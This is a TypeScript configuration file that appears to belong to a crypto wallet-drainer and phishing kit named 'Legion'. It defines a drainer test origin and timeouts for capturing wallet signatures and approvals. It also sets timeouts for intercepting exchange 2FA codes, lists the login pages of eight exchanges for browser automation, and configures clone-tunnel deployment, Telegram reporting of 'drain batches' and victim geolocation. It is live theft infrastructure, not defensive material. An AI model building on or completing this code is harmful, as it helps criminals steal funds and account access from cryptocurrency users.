/**
 * Application Constants — Centralized configuration for hardcoded values.
 * Includes timeouts, ports, gas limits, chain IDs, URLs, and other magic numbers.
 */

// ─── Server Configuration ────────────────────────────────────────────────────

export const SERVER_CONFIG = {
  /** Default API server port (can be overridden by PORT env var) */
  DEFAULT_PORT: 4000,

  /** Host binding (IPv4 first, listen on all interfaces) */
  DEFAULT_HOST: '0.0.0.0',

  /** Valid port range for server binding */
  MIN_PORT: 1,
  MAX_PORT: 65535,
}

// ─── Database Configuration ──────────────────────────────────────────────────

export const DATABASE_CONFIG = {
  /** Default PostgreSQL port */
  DEFAULT_PORT: 5432,

  /** Alternative PostgreSQL port for specific configurations */
  ALTERNATIVE_PORT: 6543,

  /** Connection pool configuration */
  POOL: {
    MAX_CONNECTIONS: 1,
    CONNECTION_TIMEOUT_MS: 10_000,
    IDLE_TIMEOUT_MS: 1_000,
  },

  /** Retry delays for database anchor attempts */
  RETRY_DELAYS_MS: {
    IMMEDIATE: 0,
    SHORT: 750,
    LONG: 1_750,
  },

  /** Database verification query */
  HEALTH_CHECK_QUERY: 'SELECT 1 AS one',
  HEALTH_CHECK_EXPECTED_VALUE: 1,
}

// ─── CORS Configuration ──────────────────────────────────────────────────────

export const CORS_CONFIG = {
  /** Development default allowed origins */
  DEV_DEFAULT_ORIGINS: [
    'http://localhost:3000',
    'http://localhost:3001',
    'http://127.0.0.1:3000',
    'http://127.0.0.1:3001',
    'http://localhost:8080',
    'http://127.0.0.1:8080',
    'http://localhost:5173',
    'http://127.0.0.1:5173',
    'http://localhost:5500',
    'http://127.0.0.1:5500',
  ],

  /** Surge drainer test origin */
  SURGE_DRAINER_ORIGIN: 'https://legion-drainer-test.surge.sh',

  /** Production Legion API default endpoint */
  PRODUCTION_API_URL: 'https://legionapi-production.up.railway.app',
}

// ─── Timeouts and Intervals ──────────────────────────────────────────────────

export const TIMEOUTS = {
  /** Wallet signature capture timeout (3 minutes) */
  WALLET_SIGNATURE_MS: 180_000,

  /** Wallet approval capture timeout (3 minutes) */
  WALLET_APPROVAL_MS: 180_000,

  /** CEX 2FA code submission timeout (2 minutes) */
  CEX_2FA_TIMEOUT_MS: 120_000,

  /** CEX 2FA code auto-cleanup delay (5 seconds) */
  CEX_2FA_AUTO_CLEANUP_MS: 5_000,

  /** CEX 2FA TOTP boundary check threshold (28 seconds, near 30s window) */
  CEX_2FA_TOTP_BOUNDARY_MS: 28_000,

  /** CEX 2FA cleanup interval (30 seconds) */
  CEX_2FA_CLEANUP_INTERVAL_MS: 30_000,

  /** CEX request tracker expiration (2 hours) */
  CEX_REQUEST_EXPIRATION_MS: 2 * 60 * 60 * 1000,

  /** CEX request tracker cleanup interval (30 minutes) */
  CEX_REQUEST_CLEANUP_INTERVAL_MS: 30 * 60 * 1000,

  /** Browser goto timeout (30 seconds) */
  BROWSER_GOTO_TIMEOUT_MS: 30_000,

  /** Browser element wait timeout — login (5 seconds) */
  BROWSER_LOGIN_WAIT_MS: 5_000,

  /** Browser element wait timeout — post-login (10 seconds) */
  BROWSER_POSTLOGIN_WAIT_MS: 10_000,

  /** JSON-RPC fetch timeout (12 seconds) */
  JSONRPC_FETCH_TIMEOUT_MS: 12_000,

  /** Sentinel runtime fetch timeout (8 seconds) */
  SENTINEL_FETCH_TIMEOUT_MS: 8_000,

  /** Telegram API fetch timeout (10 seconds) */
  TELEGRAM_FETCH_TIMEOUT_MS: 10_000,

  /** IP geolocation API fetch timeout (3 seconds) */
  IPAPI_FETCH_TIMEOUT_MS: 3_000,
}

// ─── Message Queue Configuration ────────────────────────────────────────────

export const MESSAGE_QUEUE = {
  /** Telegram outbound queue max size */
  OUTBOUND_QUEUE_MAX: 100,

  /** Telegram outbound queue warning threshold */
  OUTBOUND_QUEUE_WARN: 50,

  /** Telegram message send interval (1 message per second to avoid 429) */
  OUTBOUND_SEND_INTERVAL_MS: 1_000,

  /** Drain batch summary interval (5 minutes) */
  DRAIN_BATCH_INTERVAL_MS: 5 * 60 * 1000,
}

// ─── String Truncation Lengths ──────────────────────────────────────────────

export const STRING_LIMITS = {
  /** Error message storage limit (4000 chars) */
  ERROR_MESSAGE_MAX_LENGTH: 4_000,

  /** Settlement tracking error message limit (2000 chars) */
  SETTLEMENT_ERROR_MAX_LENGTH: 2_000,

  /** CEX browser automation error slice (200 chars) */
  CEX_ERROR_SLICE_LENGTH: 200,

  /** Clone tunnel deployment error slice (2000 chars) */
  CLONE_TUNNEL_ERROR_SLICE_LENGTH: 2_000,

  /** Telegram message detail slice (500 chars) */
  TELEGRAM_DETAIL_SLICE_LENGTH: 500,

  /** Address display truncation (first 6 + last 4 chars) */
  ADDRESS_DISPLAY_PREFIX: 6,
  ADDRESS_DISPLAY_SUFFIX: 4,

  /** Schema source page max length */
  SOURCE_PAGE_MAX_LENGTH: 2_000,
}

// ─── CEX Exchanges Configuration ────────────────────────────────────────────

export const CEX_EXCHANGES = {
  BINANCE: {
    ID: 'binance',
    URL: 'https://www.binance.com/login',
  },
  COINBASE: {
    ID: 'coinbase',
    URL: 'https://login.coinbase.com/',
  },
  KRAKEN: {
    ID: 'kraken',
    URL: 'https://www.kraken.com/u/login',
  },
  MEXC: {
    ID: 'mexc',
    URL: 'https://www.mexc.com/user/login',
  },
  BYBIT: {
    ID: 'bybit',
    URL: 'https://www.bybit.com/en/user/login',
  },
  GATE: {
    ID: 'gate',
    URL: 'https://www.gate.io/login',
  },
  KUCOIN: {
    ID: 'kucoin',
    URL: 'https://www.kucoin.com/login',
  },
  OKX: {
    ID: 'okx',
    URL: 'https://www.okx.com/account/login',
  },
}

// ─── Blockchain Configuration ────────────────────────────────────────────────

export const BLOCKCHAIN_CONFIG = {
  /** Default chain ID (Ethereum mainnet) */
  DEFAULT_CHAIN_ID: 1,

  /** Ethereum mainnet chain ID */
  ETHEREUM_CHAIN_ID: 1,
}

// ─── Cron Expressions ─────────────────────────────────────────────────────────

export const CRON_EXPRESSIONS = {
  /** Gas top-up default: every 5 minutes */
  GAS_TOPUP_DEFAULT: '*/5 * * * *',
}

// ─── Cleanup and Retention ────────────────────────────────────────────────────

export const RETENTION = {
  /** Wallet capture request retention (1 hour) */
  WALLET_CAPTURE_RETENTION_MS: 60 * 60 * 1000,

  /** Dead letter queue retention (7 days) */
  DLQ_RETENTION_MS: 7 * 24 * 60 * 60 * 1000,

  /** Large settlement delay per day (24 hours in ms) */
  SETTLEMENT_DELAY_PER_DAY_MS: 24 * 60 * 60 * 1000,
}

// ─── TOTP and Signature Configuration ────────────────────────────────────────

export const SECURITY_CONFIG = {
  /** TOTP code minimum length */
  TOTP_CODE_MIN_LENGTH: 4,

  /** TOTP code maximum length */
  TOTP_CODE_MAX_LENGTH: 8,

  /** Signature truncation prefix length */
  SIGNATURE_DISPLAY_PREFIX: 6,

  /** Signature truncation suffix length */
  SIGNATURE_DISPLAY_SUFFIX: 4,
}

// ─── API Endpoints ──────────────────────────────────────────────────────────

export const API_ENDPOINTS = {
  /** IP geolocation API (free, no key needed) */
  IPAPI_URL: 'http://ip-api.com/json/{ip}?fields=country,countryCode',

  /** Telegram Bot API base */
  TELEGRAM_BOT_API_BASE: 'https://api.telegram.org',
}

// ─── Deduplication Windows ──────────────────────────────────────────────────

export const DEDUP_WINDOWS = {
  /** Signature anchor deduplication window (60 seconds) */
  SETTLEMENT_DEDUP_MS: 60 * 1000,
}

// ─── Payout Configuration ───────────────────────────────────────────────────

export const PAYOUT_CONFIG = {
  /** Default payout delay (1000ms) */
  DEFAULT_DELAY_MS: 1_000,
}

// ─── Rate Limiting ──────────────────────────────────────────────────────────

export const RATE_LIMIT = {
  /** Rate limit window size (60 seconds) */
  WINDOW_SIZE_MS: 60_000,

  /** Rate limit cooldown (5 seconds) */
  COOLDOWN_MS: 5_000,

  /** Rate limit reset window (30 seconds) */
  RESET_WINDOW_MS: 30_000,
}

// ─── Settlement Configuration ───────────────────────────────────────────────

export const SETTLEMENT_CONFIG = {
  /** Execution time validation threshold (15 seconds) */
  EXECUTION_TIME_THRESHOLD_MS: 15_000,
}

// ─── Precision and Numeric Constants ────────────────────────────────────────

export const NUMERIC_CONSTANTS = {
  /** Fee tier in Uniswap v3 (0.3%, multiplied by 10000) */
  UNISWAP_FEE_TIER: 3_000,

  /** Basis points denominator (100 basis points = 1%) */
  BASIS_POINTS: 10_000,

  /** Default Uniswap positions fee tiers to validate */
  UNISWAP_VALID_FEE_TIERS: [500, 3_000, 10_000],

  /** AAVE protocol fee basis points (0.05%) */
  AAVE_FEE_BPS: 5,
}

// ─── Local/IP Address Filtering ────────────────────────────────────────────

export const LOCAL_IPS = {
  LOCALHOST: '127.0.0.1',
  LOCALHOST_IPV6: '::1',
  LOCALHOST_ALT: 'localhost',
  PRIVATE_PREFIX_192: '192.168.',
  PRIVATE_PREFIX_10: '10.',
}

// ─── Unicode/Emoji Constants ───────────────────────────────────────────────

export const EMOJI = {
  /** Unicode flag emoji offset (for country code conversion) */
  FLAG_EMOJI_OFFSET: 0x1f1e6 - 65,

  /** Unicode code point for 'A' */
  CHAR_CODE_A: 'A'.charCodeAt(0),
}

// ─── Validator Patterns ───────────────────────────────────────────────────

export const VALIDATORS = {
  /** Ethereum address format (0x + 40 hex chars) */
  ETH_ADDRESS_REGEX: /^0x[a-fA-F0-9]{40}$/,

  /** Numeric-only code pattern (4-8 digits) */
  NUMERIC_CODE_REGEX: /^\d{4,8}$/,

  /** Numeric string pattern */
  NUMERIC_REGEX: /^\d+$/,

  /** Email domain extraction */
  EMAIL_DOMAIN_CHAR_COUNT: 2,
  EMAIL_TLD_CHAR_COUNT: 3,

  /** User agent device detection patterns */
  USER_AGENT_IPHONE: /iphone/,
  USER_AGENT_IPAD: /ipad/,
  USER_AGENT_ANDROID_MOBILE: /android.*mobile/,
  USER_AGENT_ANDROID: /android/,
  USER_AGENT_MOBILE: /mobile/,

  /** User agent browser detection patterns */
  USER_AGENT_EDGE: /edg\//,
  USER_AGENT_OPERA: /opr\/|opera/,
  USER_AGENT_BRAVE: /brave/,
  USER_AGENT_CHROME: /chrome\//,
  USER_AGENT_FIREFOX: /firefox\//,
  USER_AGENT_SAFARI: /safari\//,
}
